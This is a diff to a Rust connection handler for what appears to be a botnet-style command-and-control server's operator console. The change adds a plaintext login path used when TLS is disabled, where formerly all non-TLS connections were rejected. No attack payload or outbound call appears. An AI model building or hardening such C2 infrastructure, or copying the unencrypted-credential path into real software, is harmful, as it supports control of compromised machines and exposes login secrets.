@@ -1,8 +1,8 @@
 use tokio::net::TcpStream;
-use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt};
+use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
 use std::sync::Arc;
 use std::time::Duration;
-use tracing::{info, warn, error, debug};
+use tracing::{info, warn, error};
 use super::state::AppState;
 use super::error::{Result, CncError, AuditLog, log_audit_event};
 use super::auth::{User, set_title};
@@ -65,8 +65,9 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
     }
 
     if let Some(ref acceptor) = state.tls_acceptor {
+        let handshake_timeout = Duration::from_secs(state.config.read().await.handshake_timeout_secs);
         match tokio::time::timeout(
-            Duration::from_secs(state.config.read().await.handshake_timeout_secs),
+            handshake_timeout,
             accept_tls_connection(acceptor, conn)
         ).await {
             Ok(Ok(tls_stream)) => {
@@ -101,12 +102,37 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
             }
         }
     } else {
-        // TLS is mandatory for production. Reject plaintext connections.
-        let mut conn = BufReader::new(conn);
-        let warning = "\x1b[38;5;196m[!] ERROR: TLS ENCRYPTION REQUIRED. CONNECTION REJECTED.\n\r";
-        let _ = conn.write_all(warning.as_bytes()).await;
-        warn!("Rejected plaintext connection from {} (TLS required)", addr);
-        return Ok(());
+        if !state.config.read().await.enable_tls {
+            let mut stream = BufReader::new(conn);
+            stream.write_all(title.as_bytes()).await?;
+            stream.write_all(resize_sequence.as_bytes()).await?;
+            
+            match auth_user_interactive(&mut stream, &addr, &state).await {
+                Ok(user) => {
+                    info!("✓ User {} authenticated from {}", user.username, addr);
+                    stream.write_all(b"\x1b[0m\r\x1b[38;5;51m[+] Authentication Successful\n").await?;
+                    let client = match state.client_manager.add_client(Client::new(stream, user)?).await {
+                        Ok(c) => c,
+                        Err(e) => {
+                            error!("Failed to add client: {}", e);
+                            return Err(e);
+                        }
+                    };
+                    handle_authenticated_user(client, state, &registry).await?;
+                }
+                Err(e) => {
+                    warn!("✗ Authentication failed from {}: {}", addr, e);
+                    let _ = stream.write_all(b"\x1b[0m\r\x1b[38;5;196m[-] Authentication Failed\n").await;
+                }
+            }
+        } else {
+            // TLS is mandatory for production. Reject plaintext connections.
+            let mut conn = BufReader::new(conn);
+            let warning = "\x1b[38;5;196m[!] ERROR: TLS ENCRYPTION REQUIRED. CONNECTION REJECTED.\n\r";
+            let _ = conn.write_all(warning.as_bytes()).await;
+            warn!("Rejected plaintext connection from {} (TLS required)", addr);
+            return Ok(());
+        }
     }
     Ok(())
 }
